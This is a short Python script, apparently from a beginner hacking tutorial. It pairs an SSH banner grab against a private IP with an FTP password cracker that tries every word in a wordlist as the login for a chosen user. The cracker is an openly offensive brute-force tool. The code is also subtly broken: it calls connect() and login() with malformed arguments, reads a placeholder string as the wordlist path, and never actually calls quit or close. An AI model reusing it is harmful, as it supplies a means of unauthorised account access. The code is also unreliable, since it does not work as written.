"""
DOCSTRING
"""
import ftplib
import socket

def network_connection():
    """
    DOCSTRING
    """
    s = socket.socket()
    s.connect('192.168.1.109', 22)
    answer = s.recv(1024)
    print(answer)
    s.close

def password_cracker():
    """
    DOCSTRING
    """
    server = input('What is the IP address of the FTP server:')
    print(server)
    user_name = input('What user name are you trying to crack:')
    print(user_name)
    password_list = ('Provide the path and file name for your password list')
    print(password_list)
    try:
        with open(password_list, 'r') as password:
            for word in password:
                word = word.strip('\r')
                try:
                    ftp = ftplib.FTP(server)
                    ftp.login(user_name.word)
                    print('You have conncted to the FTP server.')
                    print('The password is' + word)
                    ftp.quit
                except:
                    print('Still trying . . .')
    except:
        print('There is a word list error. Either it is an incorrect path or does not exist.')

def print_variables():
    """
    DOCSTRING
    """
    string_variable = 'Hackers-Arise is the best place to learn hacking.'
    integer_variable = 12
    floating_point_variable = 3.1415
    list_variable = [1, 2, 3, 4, 5]
    dictionary_variable = {'name':'OccupyTheWeb', 'value':27}
    print(string_variable)
    print(integer_variable)
    print(floating_point_variable)
    print(list_variable[3])
